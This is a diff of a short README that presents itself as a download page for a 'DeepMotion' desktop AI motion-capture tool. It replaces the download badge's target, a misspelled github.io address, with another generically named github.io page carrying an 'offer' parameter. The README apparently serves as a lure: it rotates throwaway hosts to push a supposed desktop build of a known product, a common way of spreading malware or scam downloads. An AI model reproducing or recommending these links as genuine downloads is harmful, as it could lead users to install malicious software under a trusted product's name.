@@ -1,6 +1,6 @@
 # DeepMotion Download — Desktop AI Motion Capture Tool  
 
-[![Get DeepMotion GitHub](https://img.shields.io/badge/Get%20DeepMotion%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dowloader-desktop-app.github.io/.github/?offer=DeepMotion)  
+[![Get DeepMotion GitHub](https://img.shields.io/badge/Get%20DeepMotion%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://tools-git-app.github.io/.github/?offer=DeepMotion)  
 
 ---
 
